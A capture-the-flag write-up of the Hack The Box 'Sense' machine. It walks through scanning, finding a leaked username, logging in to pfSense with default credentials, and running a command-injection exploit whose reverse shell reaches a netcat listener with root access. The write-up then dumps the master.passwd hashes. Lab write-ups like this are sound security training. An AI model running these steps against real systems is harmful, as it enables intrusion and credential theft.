# Hackthebox Sense


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

### Service Identification

First, as always. we perform our initial enumeration of the box using Nmap.

```
Nmap scan report for 10.10.10.60
Host is up (0.037s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
443/tcp open  ssl/https?
```

So we have two webservices listening. Next I search for vulnerabilities on them:

Nmap vulnscan:

```
Nmap scan report for 10.10.10.60                                                                                                                                                                             
Host is up (0.035s latency).                                                                                                                                                                                 
                                                                                                                                                                                                             
PORT    STATE SERVICE    VERSION                                                                                                                                                                             
80/tcp  open  http       lighttpd 1.4.35                                                                                                                                                                     
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                                                         
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                                                        
|_http-passwd: ERROR: Script execution failed (use -d to debug)               
|_http-server-header: lighttpd/1.4.35                                     
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
443/tcp open  ssl/https?         
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.    
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection:                                
|   VULNERABLE:                
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High   
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.                       
|                                                            
|     References:                                     
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params:
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
|             Modulus Type: Non-safe prime
|             Modulus Source: RFC5114/1024-bit DSA group with 160-bit prime order subgroup
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle:
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  OSVDB:113251  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      http://osvdb.org/113251
|_sslv2-drown:
```

Nikto scan

```
root@kali:~/Downloads# nikto -h https://10.10.10.60
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.60
+ Target Hostname:    10.10.10.60
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=US/ST=Somewhere/L=Somecity/O=CompanyName/OU=Organizational Unit Name (eg, section)/CN=Common Name (eg, YOUR name)/emailAddress=Email Address                                
                   Ciphers:  AES256-SHA
                   Issuer:   /C=US/ST=Somewhere/L=Somecity/O=CompanyName/OU=Organizational Unit Name (eg, section)/CN=Common Name (eg, YOUR name)/emailAddress=Email Address                                
+ Start Time:         2018-12-02 14:43:24 (GMT1)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.35
+ Cookie cookie_test created without the secure flag
+ Cookie cookie_test created without the httponly flag
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                                   
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                                   
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Hostname '10.10.10.60' does not match certificate's names: Common
+ Multiple index files found: /index.html, /index.php
+ OSVDB-112004: /: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).                                                                 
+ OSVDB-112004: /index.php: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).                                                        
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ OSVDB-3092: /tree/: This might be interesting...
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ /help.php: A help file was found.
```
Exploit DB:

```
root@kali:~/htb/sense# searchsploit lighttpd
------------------------------------------------------------- ----------------------------------------
 Exploit Title                                               |  Path
                                                             | (/usr/share/exploitdb/)
------------------------------------------------------------- ----------------------------------------
Lighttpd 1.4.15 - Multiple Code Execution / Denial of Servic | exploits/windows/remote/30322.rb
Lighttpd 1.4.16 - FastCGI Header Overflow Remote Command Exe | exploits/multiple/remote/4391.c
Lighttpd 1.4.17 - FastCGI Header Overflow Arbitrary Code Exe | exploits/linux/remote/4437.c
Lighttpd 1.4.x - mod_userdir Information Disclosure          | exploits/linux/remote/31396.txt
Lighttpd < 1.4.23 (BSD/Solaris) - Source Code Disclosure     | exploits/multiple/remote/8786.txt
lighttpd - Denial of Service (PoC)                           | exploits/linux/dos/18295.txt
lighttpd 1.4.31 - Denial of Service (PoC)                    | exploits/linux/dos/22902.sh
lighttpd 1.4/1.5 - Slow Request Handling Remote Denial of Se | exploits/linux/dos/33591.sh
------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Nikto found some interesting directories that we could take a look at. 

### Content Discovey

Before checking the site manually I usually start a Gobuster scan with some pretty default wordlist.

```
root@kali:~/htb/sense# gobuster -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt,php,html                                                                   
```

Visiting the site in a brownser we are presented with a PFsense login prompt.

So let's just see if there are any known exploits in PFSense.

```
root@kali:~/htb# searchsploit pfsense
------------------------------------------------------------- ----------------------------------------
 Exploit Title                                               |  Path
                                                             | (/usr/share/exploitdb/)
------------------------------------------------------------- ----------------------------------------
pfSense - 'interfaces.php?if' Cross-Site Scripting           | exploits/hardware/remote/35071.txt
pfSense - 'pkg.php?xml' Cross-Site Scripting                 | exploits/hardware/remote/35069.txt
pfSense - 'pkg_edit.php?id' Cross-Site Scripting             | exploits/hardware/remote/35068.txt
pfSense - 'status_graph.php?if' Cross-Site Scripting         | exploits/hardware/remote/35070.txt
pfSense - (Authenticated) Group Member Remote Command Execut | exploits/unix/remote/43193.rb
pfSense 2 Beta 4 - 'graph.php' Multiple Cross-Site Scripting | exploits/php/remote/34985.txt
pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Fo | exploits/php/webapps/23901.txt
pfSense 2.1 build 20130911-1816 - Directory Traversal        | exploits/php/webapps/31263.txt
pfSense 2.2 - Multiple Vulnerabilities                       | exploits/php/webapps/36506.txt
pfSense 2.2.5 - Directory Traversal                          | exploits/php/webapps/39038.txt
pfSense 2.3.1_1 - Command Execution                          | exploits/php/webapps/43128.txt
pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Fo | exploits/php/webapps/41501.txt
pfSense 2.4.1 - Cross-Site Request Forgery Error Page Clickj | exploits/php/remote/43341.rb
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injecti | exploits/php/webapps/43560.py
pfSense Community Edition 2.2.6 - Multiple Vulnerabilities   | exploits/php/webapps/39709.txt
pfSense Firewall 2.2.5 - Config File Cross-Site Request Forg | exploits/php/webapps/39306.html
pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery | exploits/php/webapps/39695.txt
pfSense UTM Platform 2.0.1 - Cross-Site Scripting            | exploits/freebsd/webapps/24439.txt
------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
``` 

There are some interesting ones, but these seems to require us to be authenticated on the host.

After Googling some default credentials (found admin/pfsense) I tried some simple combinations of usernames and passwords but none of them worked.

Next I made a huge mistake. I started a brute-force attack of the login page. This is really bad in this case because after 15 attempts we are blocked for a really long time period, something like a day.

This sucks, so NOTE TO SELF: Use brute-force as a last resort only. And generally you should not be needing to use brute-force on Hackthebox anyways. In some sense this goes for real pentests as well, you really dont want to crash or get blocked from a production system on a pentest gig. 

It's a good thing we can cheat on htb and revert the box, which I did at this point.

So our Gubuster scan has given us the following results:


```
root@kali:~/htb/sense# gobuster -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt,php,html                                                                   

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.60/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php,html
[+] Timeout      : 10s
=====================================================
2018/12/02 15:47:53 Starting gobuster
=====================================================
/index.php (Status: 200)
/index.html (Status: 200)
/help.php (Status: 200)
/themes (Status: 301)
/stats.php (Status: 200)
/css (Status: 301)
/edit.php (Status: 200)
/includes (Status: 301)
/license.php (Status: 200)
/system.php (Status: 200)
/status.php (Status: 200)
/javascript (Status: 301)
/changelog.txt (Status: 200)
/classes (Status: 301)
/exec.php (Status: 200)
/widgets (Status: 301)
/graph.php (Status: 200)
/tree (Status: 301)
/wizard.php (Status: 200)
/shortcuts (Status: 301)
/pkg.php (Status: 200)
/installer (Status: 301)
/wizards (Status: 301)
/xmlrpc.php (Status: 200)
/reboot.php (Status: 200)
/interfaces.php (Status: 200)
/csrf (Status: 301)
/system-users.txt (Status: 200)
...
```

Note that I used the -x flag to add some filetypes for the scan.

A lot of the files just redirect us to the login page. The two textfiles however discoles some really useful information.

https://10.10.10.60/changelog.txt

```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

https://10.10.10.60/system-users.txt

```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

Great so we may have a valid username. Let's try it with the default password for PFSense I found earlier (rohit/pfsense). Bingo we are logged in.


## Initial Compromise

Now that we are authenticated, we could try the RCE exploits. We also see the exact version of PFsense that is installed "2.1.3-RELEASE (amd64)"

The exploit "pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection" seem like it could work for our version of the application. The vulnerabilites are well explained here: https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/.

There is a Metasploit module for this exploit but I encountered some problems trying to make it work. 

```
msf exploit(unix/http/pfsense_graph_injection_exec) > exploit 

[*] Started reverse TCP handler on 10.10.14.9:80 
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[!] This exploit may require manual cleanup of 'i' on the target
[*] Exploit completed, but no session was created.
```

So instead I ended up using the exploit reffered to in exploit-db (https://www.exploit-db.com/exploits/43560)


Running the exploit:

```
root@kali:~/htb/sense# python3 pfsense_exploit.py --rhost 10.10.10.60 --lhost 10.10.14.9 --lport 443 --username rohit --password pfsense                                                                    
CSRF token obtained
Running exploit...
Exploit completed

```

Catching the shell:

```
root@kali:~/htb# nc -lvp 443
listening on [any] 443 ...
10.10.10.60: inverse host lookup failed: Unknown host
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.60] 38589
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# hostname
pfSense.localdomain
```

We are instantly root.

Sometimes it is actually easier to use standalone exploits that trying to figure out why Metasploit is not working.

## Dumping credentials

On a BSD OS the shadow file equivalent is called "master.passwd".

```
root:$1$gDyBgZkB$gPfZd5kHRQ/c/E/YerLft1:0:0::0:0:Charlie &:/root:/bin/sh
toor:*:0:0::0:0:Bourne-again Superuser:/root:
daemon:*:1:1::0:0:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5::0:0:System &:/:/usr/sbin/nologin
bin:*:3:7::0:0:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533::0:0:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533::0:0:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13::0:0:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8::0:0:News Subsystem:/:/usr/sbin/nologin
man:*:9:9::0:0:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25::0:0:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26::0:0:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53::0:0:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62::0:0:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64::0:0:pflogd privsep user:/var/empty:/usr/sbin/nologin
www:*:80:80::0:0:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
nobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/usr/sbin/nologin
dhcpd:*:1002:1002::0:0:DHCP Daemon:/nonexistent:/sbin/nologin
_dhcp:*:65:65::0:0:dhcp programs:/var/empty:/usr/sbin/nologin
_isakmpd:*:68:68::0:0:isakmpd privsep:/var/empty:/sbin/nologin
uucp:*:66:66::0:0:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6::0:0:Post Office Owner:/nonexistent:/usr/sbin/nologin
_ntp:*:123:123::0:0:NTP daemon:/var/empty:/sbin/nologin
_relayd:*:913:913::0:0:Relay Daemon:/var/empty:/usr/sbin/nologin
admin:$1$gDyBgZkB$gPfZd5kHRQ/c/E/YerLft1:0:0::0:0:System Administrator:/root:/etc/rc.initial
rohit:*LOCKED*$1$Mp36tTp7$i45qiAbbNfQEcOYCmCelQ0:2000:65534::0:0:Rohit:/home/rohit:/sbin/nologin
```
